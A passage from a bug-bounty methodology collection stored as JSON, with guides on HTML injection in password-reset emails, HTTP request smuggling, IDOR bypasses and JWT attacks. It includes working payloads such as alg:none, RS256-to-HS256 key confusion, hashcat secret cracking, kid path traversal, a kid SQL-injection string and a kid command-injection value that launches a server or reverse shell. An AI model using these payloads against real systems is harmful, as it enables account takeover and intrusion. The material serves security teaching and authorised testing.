'GET' -H 'Host: <site>' -H 'X-rewrite-url: admin/login' 'https://<site>/'.`\r\n\r\n\r\n## Author:\r\n* [@KathanP19](https://twitter.com/KathanP19)\r\n"
    }
  ],
  "HTML_Injection": [
    {
      "HTML_Injection_on_password_reset_page.md": "\r\n## Summary\r\nPassword reset links are usually addressed to your account name followed by the reset link. Also if the application allows\r\nyou to have your account name with tags and special characters then you should try this.\r\n\r\n### Steps\r\n\r\n1. Create your account\r\n2. Edit your name to `<h1>attacker</h1>` or `\"abc><h1>attacker</h1>` and save it.\r\n3. Request for a reset password and check your email.\r\n4. You will notice the `<h1>` tag getting executed\r\n\r\n* HTML injection are usually considered as low to medium severity bugs but you can escalate the severity by serving a \r\nmalicious link by using `<a href>` for eg: `<h1>attacker</h1><a href=\"your-controlled-domain\"Click here</a>`\r\n\r\n* You can redirect the user to your malicious domain and serve a fake reset password page to steal credentials \r\nAlso you can serve a previously found XSS page and steal user cookies etc etc.. The creativity lies on you..\r\n\r\n## Author\r\n[@C1pher15](https://twitter.com/C1pher15)\r\n"
    }
  ],
  "HTTP_Desync": [
    {
      "http_desync.md": "# HTTP Desync or Request Smuggling:\r\n- Basics:\r\n\"HTTP request smuggling is a technique for interfering with the way a web site processes sequences of HTTP requests that are received from one or more users. Request smuggling vulnerabilities are often critical in nature, allowing an attacker to bypass security controls, gain unauthorized access to sensitive data, and directly compromise other application users. \" -Portswigger  \r\n\r\n\r\n ## Where ?:  \r\n\r\n - Any Endpoint might be Vulnerable to HTTP Desync attack.  \r\n \r\n - You can Find the Vulnerability on Non-endpoints as well, But impact is always much higher on Sensitive Endpoints ;)\r\n ---\r\n ### Step 1:  \r\n\r\n * Go To Repeater tab, and try various Timing based payloads to confirm the bug. More Explaination here:  \r\n\r\n[Finding the Vulnerability](https://portswigger.net/web-security/request-smuggling/finding)\r\n\r\n### Step 2:  \r\n\r\n* Once you have successfully discovored the bug, you can chain it with various bugs eg. Account Takeover by stealing session IDs, Cross side Scripting Attacks in User-Agent Header,etc. More Description here:  \r\n\r\n[Exploiting the Vulnerability](https://portswigger.net/web-security/request-smuggling/exploiting)  \r\n\r\n---\r\n## Tools:  \r\n\r\n1. [defparam`s_smuggler.py](https://github.com/defparam/smuggler)  \r\n\r\n`Usage:`  \r\n* Smuggler.py :\r\n\r\n    `cat alive_urls.txt | python3 smuggler.py -m GET/POST #either GET or POST ` \r\n    \r\n    OR\r\n    \r\n    ` python3 smuggler.py -u https://example.com -m GET/POST  `\r\n    \r\n2. [Burp_smuggler](https://github.com/PortSwigger/http-request-smuggler) (also available in BApp store)  \r\n\r\n## More Info:  \r\n\r\n### Topics  \r\n\r\nhttps://paper.seebug.org/1049/ (Recommended !)  \r\n\r\n[Portswigger Topic](https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn)  \r\n\r\n[Portswigger Lab](https://portswigger.net/web-security/request-smuggling)  \r\n\r\n### Reports (Hackerone):  \r\n\r\n[Report 1](https://hackerone.com/reports/737140)  \r\n\r\n[Report 2](https://hackerone.com/reports/867952)  \r\n\r\n[Report 3](https://hackerone.com/reports/498052)  \r\n\r\n[Report 4](https://hackerone.com/reports/526880)\r\n\r\n[Report 5](https://hackerone.com/reports/771666)  \r\n\r\n[Report 6](https://hackerone.com/reports/753939)  \r\n\r\n[Report 7](https://hackerone.com/reports/648434 )  \r\n\r\n[Report 8](https://hackerone.com/reports/740037)  \r\n\r\n## Writeups (Medium.com):  \r\n\r\n[Article 1](https://medium.com/@ricardoiramar/the-powerful-http-request-smuggling-af208fafa142)  \r\n\r\n[Article 2](https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4)  \r\n\r\n[Article 3](https://medium.com/@cc1h2e1/write-up-of-two-http-requests-smuggling-ff211656fe7d)  \r\n\r\n[Article 4](https://medium.com/bugbountywriteup/crossing-the-borders-the-illegal-trade-of-http-requests-57da188520ca)  \r\n\r\n## Extra:  \r\n\r\n[A Brief Video About Req. Smuggling](https://youtu.be/gzM4wWA7RFo)\r\n\r\n### Author:\r\n[Neutron__](https://twitter.com/Neutron__)\r\n###### If you think something was missed, feel free to add/modify/delete it :)\r\n"
    }
  ],
  "IDOR": [
    {
      "IDOR-Old.md": "## Testing for IDOR/Broken object level authorization:\r\n\r\nDifficulty: Easy \r\n\r\nTips: Don't blindly test for changing numbers till you get PII, tools can do this for you\r\n\r\n**Finding IDOR Attack Vectors Ideas:**\r\n\r\n1. What  do they use for authorization?(JWT, API Keys, cookies, tokens) Tip: Find this out by replacing high privaledge authorization with lower privaledge authorization and seeing what the server responds with\r\n2. Understand how they use ID's, hashes, and their API. Do this by looking at the API Documentations if they have one.\r\n\r\n***Every time you see a new API endpoint that receives an object ID from the client, ask yourself the following questions:***\r\n\r\n- Does the ID belong to a private resource? (e.g /api/user/123/news vs  /api/user/123/transaction)\r\n- What are the IDs that belong to me?\r\n- What are the different possible roles in the API?(For example — user, driver, supervisor, manager)\r\n\r\n## Bypassing Object Level Authorization:\r\n\r\n- Add parameters onto the endpoints for example, if there was\r\n\r\n```html\r\nGET /api_v1/messages --> 401\r\nvs \r\nGET /api_v1/messages?user_id=victim_uuid --> 200\r\n```\r\n\r\n- HTTP Parameter pollution\r\n\r\n```html\r\nGET /api_v1/messages?user_id=VICTIM_ID --> 401 Unauthorized\r\nGET /api_v1/messages?user_id=ATTACKER_ID&user_id=VICTIM_ID --> 200 OK\r\n\r\nGET /api_v1/messages?user_id=YOUR_USER_ID[]&user_id=ANOTHER_USERS_ID[]\r\n```\r\n\r\n- Add .json to the endpoint, if it is built in Ruby!\r\n\r\n```html\r\n/user_data/2341 --> 401 Unauthorized\r\n/user_data/2341.json --> 200 OK\r\n```\r\n\r\n- Test on outdated API Versions\r\n\r\n```html\r\n/v3/users_data/1234 --> 403 Forbidden\r\n/v1/users_data/1234 --> 200 OK\r\n```\r\n\r\n* Wrap the ID with an array.\r\n\r\n```html\r\n{“id”:111} --> 401 Unauthriozied\r\n{“id”:[111]} --> 200 OK\r\n```\r\n\r\n* Wrap the ID with a JSON object:\r\n\r\n```html\r\n{“id”:111} --> 401 Unauthriozied\r\n\r\n{“id”:{“id”:111}} --> 200 OK\r\n```\r\n\r\n* JSON Parameter Pollution:\r\n\r\n```html\r\nPOST /api/get_profile\r\nContent-Type: application/json\r\n{“user_id”:<legit_id>,”user_id”:<victim’s_id>}\r\n```\r\n\r\n- Try to send a wildcard(*) instead of an ID. It’s rare, but sometimes it works.\r\n- If it is a number id, be sure to test through a large amount of numbers, instead of just guessing\r\n- If endpoint has a name like /api/users/myinfo, check for /api/admins/myinfo\r\n- Replace request method with GET/POST/PUT\r\n- Use burp extension autorize\r\n- If none of these work, get creative and ask around!\r\n\r\n## Escalating/Chaining with IDOR's Ideas:\r\n\r\n1.  Lets say you find a low impact IDOR, like changing someone elses name, chain that with XSS and you have stored XSS!\r\n2. If you find IDOR on and endpoint, but it requires UUID, chain with info disclosure endpoints that leak UUID, and bypass this!\r\n3. If none of these work, get creative and ask around!\r\n\r\n### Reference\r\n[https://twitter.com/swaysThinking/status/1301663848223715328](https://twitter.com/swaysThinking/status/1301663848223715328)\r\n\r\n### Reports (Hackerone)\r\n\r\n#### Resolved\r\n\r\n- [IDOR to delete images from other stores](https://hackerone.com/reports/404797)\r\n- [IDOR in changing shared file name](https://hackerone.com/reports/547663)\r\n- [User uploaded portfolio files can be accessed by any user even after deleted](https://hackerone.com/reports/300179)\r\n- [IDOR and statistics leakage in Orders](https://hackerone.com/reports/544329)\r\n- [I.D.O.R To Order,Book,Buy,reserve On YELP FOR FREE (UNAUTHORIZED USE OF OTHER USER'S CREDIT CARD)](https://hackerone.com/reports/391092)\r\n- [IDOR allow access to payments data of any user](https://hackerone.com/reports/751577)\r\n- [IDOR allow to extract all registered email](https://hackerone.com/reports/302485)\r\n- [IDOR at https://account.mackeeper.com/at/load-reports/profile/<profile_id> leaks information about devices/licenses](https://hackerone.com/reports/783117)\r\n- [IDOR bug to See hidden slowvote of any user even when you dont have access right](https://hackerone.com/reports/661978)\r\n- [IDOR on update user preferences](https://hackerone.com/reports/854290)\r\n- [idor on upload profile functionality](https://hackerone.com/reports/741683)\r\n- [IDOR to view User Order Information](https://hackerone.com/reports/287789)\r\n- [IDOR with Geolocation data not stripped from images](https://hackerone.com/reports/906907)\r\n- [Replace other user files in Inbox messages](https://hackerone.com/reports/322661)\r\n\r\n### Author\r\n\r\n* [@harsha0x01](https://twitter.com/harsha0x01)\r\n* [@klaus](https://twitter.com/klaus_dev)\r\n"
    },
    {
      "IDOR.md": "# IDOR\r\n\r\n- At its core, an IDOR is an access control vulnerability in which an application relies on user-supplied input to reference objects directly. In this case, the object could be a picture, a comment on a post, personally identifiable information (PII) associated with a user or even an entire department within an organization.\r\n- Insecure Direct Object References occur when an application provides direct access to objects based on user-supplied input. As a result of this vulnerability attackers can bypass authorization and access resources in the system directly, for example database records or files. Insecure Direct Object References allow attackers to bypass authorization and access resources directly by modifying the value of a parameter used to directly point to an object. Such resources can be database entries belonging to other users, files in the system, and more.\r\n- IDORs can exist throughout the entire application so it is always suggested that if you see IDs then to always test, even if they are guids or some type of \"encrypted id\". Look for potential leaks of this ID (public profile?) or look for patterns and see if you can generate your own & run it through burp intruder.\r\n\r\n## Types of IDOR you will see in wild:\r\n\r\n1. The value of a parameter is used directly to retrieve a database record\r\n    \r\n    ```markdown\r\n    http://foo.bar/somepage?invoice=12345\r\n    ```\r\n    \r\n2. The value of a parameter is used directly to perform an operation in the system\r\n    \r\n    ```markdown\r\n    http://foo.bar/changepassword?user=someuser\r\n    ```\r\n    \r\n3. The value of a parameter is used directly to retrieve a file system resource\r\n    \r\n    ```markdown\r\n    http://foo.bar/showImage?img=img00011\r\n    ```\r\n    \r\n4. The value of a parameter is used directly to access application functionality\r\n    \r\n    ```markdown\r\n    http://foo.bar/accessPage?menuitem=12\r\n    ```\r\n    \r\n\r\n# Testing for IDOR - ( Manual-Method ):\r\n\r\n## **Base Steps:**\r\n\r\n```markdown\r\n1. Create two accounts if possible or else enumerate users first. \r\n2. Check if the endpoint is private or public and does it contains any kind of id param.\r\n3. Try changing the param value to some other user and see if does anything to their account.\r\n4. Done !!\r\n```\r\n\r\n## Testcase - 1: Add IDs to requests that don’t have them\r\n\r\n```jsx\r\nGET /api/MyPictureList → /api/MyPictureList?user_id=<other_user_id>\r\n\r\nPro tip: You can find parameter names to try by deleting or editing other objects and seeing the parameter names used.\r\n```\r\n\r\n## Testcase - 2: Try replacing parameter names\r\n\r\n```jsx\r\nInstead of this:\r\nGET /api/albums?album_id=<album id>\r\n\r\nTry This:\r\nGET /api/albums?account_id=<account id>\r\n\r\nTip: There is a Burp extension called Paramalyzer which will help with this by remembering all the parameters you have passed to a host.\r\n```\r\n\r\n## Testcase - 3: Supply multiple values for the same parameter.\r\n\r\n```jsx\r\nInstead of this:\r\nGET /api/account?id=<your account id> →\r\n\r\nTry this:    \r\nGET /api/account?id=<your account id>&id=<admin's account id>\r\n\r\nTip: This is known as HTTP parameter pollution. Something like this might get you access to the admin’s account\r\n```\r\n\r\n## Testcase - 4: Try changing the HTTP request method when testing for IDORs\r\n\r\n```jsx\r\nInstead of this:\r\nPOST /api/account?id=<your account id> →\r\n\r\nTry this:    \r\nPUT /api/account?id=<your account id>\r\n\r\nTip: Try switching POST and PUT and see if you can upload something to another user’s profile. For RESTful services, try changing GET to POST/PUT/DELETE to discover create/update/delete actions.\r\n```\r\n\r\n## Testcase - 5: Try changing the request’s content type\r\n\r\n```jsx\r\nInstead of this:\r\n```\r\nPOST /api/chat/join/123\r\n[…]\r\nContent-type: application/xml → \r\n<user>test</user>    \r\n```\r\nTry this:\r\n```\r\nPOST /api/chat/join/123\r\n[…]\r\nContent-type: application/json\r\n{“user”: “test”}\r\n```\r\n\r\nTip: Access controls may be inconsistently implemented across different content types. Don’t forget to try alternative and less common values like text/xml, text/x-json, and similar.\r\n```\r\n\r\n## Testcase - 6: Try changing the requested file type (Test if Ruby)\r\n\r\n```jsx\r\nExample:\r\n\r\nGET /user_data/2341 --> 401 Unauthorized\r\n\r\nGET /user_data/2341.json --> 200 OK\r\n\r\nTip: Experiment by appending different file extensions (e.g. .json, .xml, .config) to the end of requests that reference a document.\r\n```\r\n\r\n## Testcase - 7: Does the app ask for non-numeric IDs? Use numeric IDs instead\r\n\r\n```jsx\r\nThere may be multiple ways of referencing objects in the database and the application only has access controls on one. \r\nTry numeric IDs anywhere non-numeric IDs are accepted:\r\nExample:\r\n\r\nusername=user1 → username=1234\r\naccount_id=7541A92F-0101-4D1E-BBB0-EB5032FE1686 → account_id=5678\r\nalbum_id=MyPictures → album_id=12\r\n```\r\n\r\n## Testcase - 8: Try using an array\r\n\r\n```markdown\r\nIf a regular ID replacement isn’t working, try wrapping the ID in an array and see if that does the trick. For example:\r\n\r\n{“id”:19} → {“id”:[19]}\r\n```\r\n\r\n## Testcase - 9: Wildcard ID\r\n\r\n```markdown\r\nThese can be very exciting bugs to find in the wild and are so simple. Try replacing an ID with a wildcard. You might get lucky!\r\n\r\nGET /api/users/<user_id>/ → GET /api/users/*\r\n```\r\n\r\n## Testcase - 10: Pay attention to new features\r\n\r\n```markdown\r\nIf you stumble upon a newly added feature within the web app, such as the ability to upload a profile picture for an upcoming charity event, and it performs an API call to:\r\n\r\n/api/CharityEventFeb2021/user/pp/<ID>\r\n\r\nIt is possible that the application may not enforce access control for this new feature as strictly as it does for core features.\r\n```\r\n\r\n# Testing For IDOR - ( Automated Method ):\r\n\r\n[Finding Broken Access Controls](https://threat.tevora.com/finding-broken-access-controls/)\r\n\r\n[PimpMyBurp #1 - PwnFox + Autorize: The perfect combo to find IDOR - Global Bug Bounty Platform](https://blog.yeswehack.com/yeswerhackers/pimpmyburp-pwnfox-autorize-find-idor/)\r\n\r\n[Automating BURP to find IDORs](https://medium.com/cyberverse/automating-burp-to-find-idors-2b3dbe9fa0b8)\r\n\r\n# Reference:\r\n\r\n[Everything You Need to Know About IDOR (Insecure Direct Object References)](https://medium.com/@aysebilgegunduz/everything-you-need-to-know-about-idor-insecure-direct-object-references-375f83e03a87)\r\n\r\n[Finding more IDORs - Tips and Tricks | Aon](https://www.aon.com/cyber-solutions/aon_cyber_labs/finding-more-idors-tips-and-tricks/)\r\n\r\n[KathanP19/HowToHunt](https://github.com/KathanP19/HowToHunt/blob/master/IDOR/IDOR-Old.md)\r\n\r\n[Learn about Insecure Object Reference (IDOR) | BugBountyHunter.com](https://www.bugbountyhunter.com/vulnerability/?type=idor)\r\n\r\n[WSTG - v4.2](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References.html)\r\n\r\n[IDOR (Insecure Direct Object Reference)](https://notes.mufaddal.info/web/idor)\r\n\r\n[What I learnt from reading 220* IDOR bug reports.](https://medium.com/@Sm9l/what-i-learnt-from-reading-220-idor-bug-reports-6efbea44db7)\r\n\r\n### Medium:\r\n\r\n[Full account takeover worth $1000 Think out of the box](https://mokhansec.medium.com/full-account-takeover-worth-1000-think-out-of-the-box-808f0bdd8ac7)\r\n\r\n[All About Getting First Bounty with IDOR](https://infosecwriteups.com/all-about-getting-first-bounty-with-idor-849db2828c8)\r\n\r\n[](https://codeburst.io/hunting-insecure-direct-object-reference-vulnerabilities-for-fun-and-profit-part-1-f338c6a52782)\r\n\r\n[IDOR that allowed me to takeover any users account.](https://vedanttekale20.medium.com/idor-that-allowed-me-to-takeover-any-users-account-129e55871d8)\r\n\r\n[All About IDOR Attacks](https://betterprogramming.pub/all-about-idor-attacks-64c4203b518e)\r\n\r\n[Access developer tasks list of any of Facebook Application (GraphQL IDOR)](https://amineaboud.medium.com/access-developer-tasks-list-of-any-of-facebook-application-graphql-idor-62307c5e5b34)\r\n\r\n# Tips\r\n```\r\n#1 https://twitter.com/M0_SADAT/status/1361289751597359105\r\nLooking for high impact IDOR?\r\nAlways try to find the hidden parameters for this endpoints using Arjun and Parameth\r\n/settings/profile\r\n/user/profile\r\n/user/settings\r\n/account/settings\r\n/username\r\n/profile\r\nAnd any payment endpoint\r\n```\r\n`Pro tip: Don’t forget to try create/update/delete operations on objects that are publicly readable but shouldn’t be writable. Can you PUT to /api/products and change a price?`\r\n\r\n## Author\r\n[KathanP19](https://twitter.com/KathanP19)\r\n"
    }
  ],
  "JIRA": [
    {
      "README.md": "\r\n## Blogs\r\n- Jira vulnerabilities and how they are exploited in the wild - [thehackerish Blog](https://thehackerish.com/jira-vulnerabilities-and-how-they-are-exploited-in-the-wild/)\r\n\r\n\r\n# Tools\r\n- [Jira-Lens](https://github.com/MayankPandey01/Jira-Lens) [Jira-Lens 🔍 is a Python Based vulnerability Scanner for JIRA.This tool Performs 25+ Checks including CVE's and Multiple Disclosures on the Provided JIRA Instance]\r\n\r\n\r\n# Author\r\n**Name:** Mayank Pandey\r\n\r\n**Handle:** [@mayank_pandey01](https://twitter.com/mayank_pandey01)\r\n\r\n"
    }
  ],
  "JWT": [
    {
      "JWT.md": "# Introduction:\r\n\r\n- JWT is most commonly used in authorization.\r\n- A JSON Web Token (JWT) is a standardised format for securely exchanging data between two parties.\r\n- It is compact, readable and digitally signed using a private key/ or a public key pair by the Identity Provider(IdP). So the integrity and authenticity of the token can be verified by other parties involved.\r\n- The goal of using JWT is not to hide data, but to ensure the data's authenticity. JWT is signed and encoded rather than encrypted.\r\n- JWT is a stateless authentication mechanism based on tokens. Because it is a client-side stateless session, the server does not have to rely solely on a datastore (database) to save session information.\r\n- It consists of three elements:\r\n    1. **Header -** JWT header consists of token type and algorithm used for signing and encoding. Algorithms can be HMAC, SHA256, RSA, HS256 or RS256.\r\n    2. **Payload -** This is also a JSON object and is used to store the user’s information like id, username, role, token generation time and other custom claims.\r\n    3. **Signature -** The most crucial aspect of a JSON Web Token is its signature (JWT). The signature is generated by encoding the header and payload with Base64url Encoding and concatenating them with a period separator(**.**). This information is subsequently passed to the cryptography algorithm. As a result, if the header or payload changes, the signature must be computed again. Only the Identity Provider (IdP) has access to the private key used to generate the signature, which prohibits token manipulation.\r\n    \r\n    ```python\r\n    header.payload.signature\r\n    ```\r\n    \r\n- JWT can be generated with two encryption mechanisms called Symmetric and Asymmetric encryption.\r\n    - **Symmetric:** *This mechanism requires a single key to create and verify the JWT. The most common algorithm for this type is HS256.*\r\n    - **Asymmetric:** *This mechanism requires a Public key for verification and a Private key for signing the Signature. The most common algorithm for this type is RS256.*\r\n- **Key ID (kid)** is an optional header with a string type that is used to identify a specific key in the filesystem or database and then use its content to validate the Signature. This argument is useful if the Application has several keys for signing tokens, but it can be problematic if it is injectable since an attacker can refer to a specific file with predictable content.\r\n- In addition to a key ID, JSON web token standards also provide developers with the ability to specify keys via a URL.\r\n    - The token header contains a version (“**ver**”) claim. It contains the version of the JWT Token library used.\r\n    - **jku header parameter -**  *JKU is an abbreviation for \"JWK Set URL.\" It is an optional header field that specifies a URL that refers to a collection of keys needed to validate the token. If this field is not properly controlled and is permitted, an attacker might host their own key file and declare that the application uses it to validate tokens.*\r\n    - **jwk header parameter -** *The optional JWK (JSON Web Key) header parameter allows attackers to embed the key used to verify the token directly in the token.*\r\n    - **x5u and x5c header parameter -** *The x5u and x5c header arguments, like the jku and jwk headers, allow attackers to define the public key certificate or certificate chain used to verify the token. x5u defines information in URI form, whereas x5c permits certificate data to be incorporated in the token.*\r\n    - **x5t parameter** - *The \"x5t\" (x.509 certificate thumbprint) header argument returns a base64url encoded SHA-256 thumbprint (i.e., digest) of an X.509 certificate's DER encoding, which may be used to match a certificate. As a result, it is equivalent to the key identifier or the kid claim!!*\r\n- Inside Payload section you may also find: ****\r\n    - **jti** param which is used to prevent replay attack on JWT\r\n    - **iss** param — The name of the entity that issued the token.\r\n    - **iat** param — Identifies the time at which the JWT token was issued.\r\n    - **nbf** param — Identifies the time before which the JWT token MUST NOT be accepted for processing.\r\n    - **exp** param — Identifies the expiration time on or after which the JWT MUST NOT be accepted for processing.\r\n    - **aud** (audience) claim — identifies the recipients that the JWT is intended for.\r\n\r\n## Workflow:\r\n\r\n- Basically the identity provider(IdP) generates a JWT certifying user identity and Resource server decodes and verifies the authenticity of the token using secret salt / public key.\r\n\r\n```python\r\n1. User sign-in using username and password or google/facebook.\r\n2. Authentication server verifies the credentials and issues a jwt signed using either a secret salt or a private key.\r\n3. User’s Client uses the JWT to access protected resources by passing the JWT in HTTP Authorization header.\r\n4. Resource server then verifies the authenticity of the token using the secret salt/ public key.\r\n```\r\n\r\n[object Promise]\r\n\r\n# Tools:\r\n\r\n[GitHub - ticarpi/jwt_tool: A toolkit for testing, tweaking and cracking JSON Web Tokens](https://github.com/ticarpi/jwt_tool)\r\n\r\n[GitHub - hahwul/jwt-hack: 🔩 jwt-hack is tool for hacking / security testing to JWT. Supported for En/decoding JWT, Generate payload for JWT attack and very fast cracking(dict/brutefoce)](https://github.com/hahwul/jwt-hack)\r\n\r\n[GitHub - mazen160/jwt-pwn: Security Testing Scripts for JWT](https://github.com/mazen160/jwt-pwn)\r\n\r\n[GitHub - brendan-rius/c-jwt-cracker: JWT brute force cracker written in C](https://github.com/brendan-rius/c-jwt-cracker)\r\n\r\n[GitHub - jmaxxz/jwtbrute: Brute forcing jwt tokens signed with HS256 since 2014](https://github.com/jmaxxz/jwtbrute)\r\n\r\n[GitHub - Sjord/jwtcrack: Crack the shared secret of a HS256-signed JWT](https://github.com/Sjord/jwtcrack)\r\n\r\n[JSON Web Tokens](https://portswigger.net/bappstore/f923cbf91698420890354c1d8958fee6)\r\n\r\n[JSON Web Token Attacker](https://portswigger.net/bappstore/82d6c60490b540369d6d5d01822bdf61)\r\n\r\n[GitHub - wallarm/jwt-heartbreaker: The Burp extension to check JWT (JSON Web Tokens) for using keys from known from public sources](https://github.com/wallarm/jwt-heartbreaker)\r\n\r\n[JWTweak](https://rishuranjanofficial.github.io/JWTweak/)\r\n\r\n# Attacking JWT:\r\n\r\n                                                              Base Methodology:\r\n\r\n```python\r\n1. Find JWT tokens\r\n\t- We can use Regex to search in proxy history \r\n\t\t\"[= ]eyJ[A-Za-z0-9_-]*\\.[A-Za-z0-9._-]*\"\r\n\t\t\"[= ]eyJ[A-Za-z0-9_\\/+-]*\\.[A-Za-z0-9._\\/+-]*\"\r\n2. Identify a test page\r\n\t- Find a request of the page with JWT token which gives clear reponse if valid Ok else other reponse\r\n\t\tProfile page is a good start\r\n3. Check that your test cases work\r\n\t- Send the request to repeater and check if same token works again else token might have expired\r\n\t- Now start testing different attacks.\r\n```\r\n\r\n1. **Check for sensitive data in the JWT**\r\n\r\n```python\r\n1. Turn Intercept on in burp and Login to Web App\r\n2. Forward the request until you get JWT token\r\n3. Switch to JSON Web Token Tab \r\n4. Check if any user info or any sensitive info is there in payload section.\r\n5. Done!\r\n```\r\n\r\n2. ****None algorithm****\r\n\r\n```python\r\n1. Turn Intercept on in burp and Login to Web App\r\n2. Forward the request until you get JWT token\r\n3. Switch to JSON Web Token Tab or JOSEPH which also contains bypass\r\n4. Change \"alg:\" to none \"alg:none\"  \r\n\t\t{\r\n\t\t  \"alg\": \"none\",\r\n\t\t  \"typ\": \"JWT\"\r\n\t\t}\r\n5. Change the Payload and edit the signature to empty\r\n\t\tSignature = \"\"\r\n6. Forward the Request. Done!\r\n\r\nUsing JWT_Tool.\r\n1. Turn Intercept on in burp and Login to Web App\r\n2. Forward the request until you get JWT token\r\n3. Use Below command to get different bypass payload to try , replace <JWT> with your JWT token.\r\n\t\t\"python3 jwt_tool.py <JWT> -X a\"\r\n4. Use Different Payloads Generated by tool in your request, see if any of it works.\r\n5. Change you Payload value to desire with the token that worked and Done!\r\n```\r\n\r\n3. ****Change algorithm from RS256 to HS256****\r\n\r\n```python\r\nNote: This Attack will convert the workflow from Asymmetric to Symmetric encryption and now we can sign the new tokens with the same public key.\r\n\r\n1. Turn Intercept on in burp and Login to Web App\r\n2. Forward the request until you get JWT token\r\n3. Get the Public key from the Application (pubkey.pem file) using below commands.\r\n\t\t\"openssl s_client -connect example.com:443 2>&1 < /dev/null | sed -n '/-----BEGIN/,/-----END/p' > certificatechain.pem\"\r\n\t\t\"openssl x509 -pubkey -in certificatechain.pem -noout > pubkey.pem\"\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tOR\r\n\t\t\"openssl s_client -connect zonksec.com:443 | openssl x509 -pubkey -noout\"\r\n4. Then use below command to generate JWT token.\r\n\t\t\"python3 jwt_tool.py <JWT> -S hs256 -k pubkey.pem\"\r\n5. Use the generated token in the request and try changing payload.\r\n6. Done, Forward the request.\r\n\r\n* This will work when web app support both algorithm.\r\n```\r\n\r\n4. ****Signature not being checked****\r\n\r\n```python\r\n1. Turn Intercept on in burp and Login to Web App\r\n2. Forward the request until you get JWT token.\r\n3. Switch to JSON Web Token Tab or JOSEPH.\r\n4. Change Payload section and Remove the Signature completely or try changing somecharacters in signature\r\n5. Done, Forward the Request.\r\n```\r\n\r\n5. ****Crack the secret key****\r\n\r\n```python\r\n1. Turn Intercept on in burp and Login to Web App\r\n2. Forward the request until you get JWT token.\r\n3. If JWT-Heartbreaker Plugin is installed then weak secret-key will directly be shown to you.\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tOR\r\n3. Copy JWT Token and store it in a text file then usse Hashcat to crack the Secret key using below command.\r\n\t\t\"hashcat -a 0 -m 16500 jwt_token.txt /usr/share/wordlist/rockyou.txt --force\" \r\n\t\t\"hashcat -a 0 -m 16500 jwt_token.txt /usr/share/wordlist/rockyou.txt --show\" //this will show cracked secret-key\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tOR\r\n3. Use Jwt_Tool to crack the secret key using below command:\r\n\t\t\t\"python3 jwt_tool.py <JWT> -C -d secrets.txt\"\r\n4. Now Use the Secret key to forge the request using jwt.io or jwt_tool with option \"-p\"\r\n5. Done, Use the generated token in request and forward the request.\r\n\r\n* You can also find any leaking secret key in jwt.json config file.\r\n```\r\n\r\n6. **Attacks using kid in JWT token.**\r\n\r\n```python\r\nUse arbitrary files to verify\r\n1. Turn Intercept on in burp and Login to Web App\r\n2. Forward the request until you get JWT token.\r\n3. If there is kid in header section of JWT_token then forge a new JWT token using jwt_tool\r\n\t\t'python3 jwt_tool.py <JWT> -I -hc kid -hv \"../../dev/null\" -S hs256 -p \"\"' \r\n* Alternatively, we may utilise the content of any file in the web root, such as CSS or JS, to validate the Signature.\r\n\t\t'python3 jwt_tool.py -I -hc kid -hv \"path/of/the/file\" -S hs256 -p \"Content of the file\"'\r\n4. Manipulate payload section and now use the generated token in request.\r\n5. Done, Forward the Request. \r\n\r\nSQL injection\r\n1. Turn Intercept on in burp and Login to Web App\r\n2. Forward the request until you get JWT token.\r\n3. Switch to JSON Web Token Plugin tab and manipulate kid with sqli payload.\r\n4. You can try SQLi not only in kid but in any field of payload section.\r\n\t\t\"python3 jwt_tool.py <JWT> -I -pc name -pv \"admin' ORDER BY 1--\" -S hs256 -k public.pem\"\r\n5. Done, Forward the request and escalate sqli further.\r\n\r\nCommand injection\r\n1. Turn Intercept on in burp and Login to Web App\r\n2. Forward the request until you get JWT token.\r\n3. Switch to JSON Web Token Plugin tab and manipulate kid with os commands payload.\r\n\t\"kid: key.crt; whoami && python -m SimpleHTTPServer 1337 &\"\r\n4. Now use the forged JWt token in request\r\n5. Check if you can connect to the server on port 1337 or instead use reverse shell in payload and check if you get connection back\r\n6. DOne\r\n\r\n```\r\n\r\n7. ****Forged Header Parameter****\r\n\r\n```python\r\nJSON Set URL (jku)\r\n1. Turn Intercept on in burp and Login to Web App\r\n2. Forward the request until you get JWT token.\r\n3. Decode the JWT token and check if it contents jku attribute in Header section\r\n4. Generate you Public and Private Key pair using below commands:\r\n\t\t\"openssl genrsa -out keypair.pem 2048\"\r\n\t\t\"openssl rsa -in keypair.pem -pubout -out publickey.crt\"\r\n\t\t\"openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out pkcs8.key\"\r\n\t8 it will generate Public Key - \"publickey.crt\" & Private Key - \"pkcs8.key\"\r\n5. Use Jwt.io and paste the public key (publicKey.pem) and the private key (attacker.key) in their respective places in the \"Decoded\" section.\r\n6. Host the generated certificate locally and modify the jku header parameter accordingly.\r\n7. Retrieve the jwks.json file from the URL present in the jku header claim\r\n\t\t\"wget http://example.com:8000/jwks.json\"\r\n8. Make a Python script \"getPublicParams.py\":\r\n\t\tfrom Crypto.PublicKey import RSA\r\n\r\n\t\tfp = open(\"publickey.crt\", \"r\")\r\n\t\tkey = RSA.importKey(fp.read())\r\n\t\tfp.close()\r\n\r\n\t\tprint \"n:\", hex(key.n)\r\n\t\tprint \"e:\", hex(key.e)\r\n9. Run python script \"python getPublicParams.py\"\r\n10. Update the values of n and e in local jkws.json\r\n11. Hosting the JWK Set JSON file using repl.it or any server\r\n12. Manipulate the payload section and copy the generated jwt token from jwt.io\r\n13. Done, change the JWT token in our request and Forward!\r\n\r\nx5u Claim Misuse:\r\nNote: The algorithm used for signing the token is “RS256”.\r\nThe token is using x5u header parameter which contains the location of the X.509 certificate to be used for token verification.\r\n\r\n1. Turn Intercept on in burp and Login to Web App\r\n2. Forward the request until you get JWT token.\r\n3. Decode the JWT token and check if it contents x5u attribute in Header section.\r\n4. Creating a self-signed certificate\r\n\t\t\t\"openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout attacker.key -out attacker.crt\"\r\n5. Extracting the public key from the generated certificate:\r\n\t\t\t\"openssl x509 -pubkey -noout -in attacker.crt > publicKey.pem\"\r\n6. Use Jwt.io and paste the public key (publicKey.pem) and the private key (attacker.key) in their respective places in the \"Decoded\" section.\r\n7. Set \"x5u: 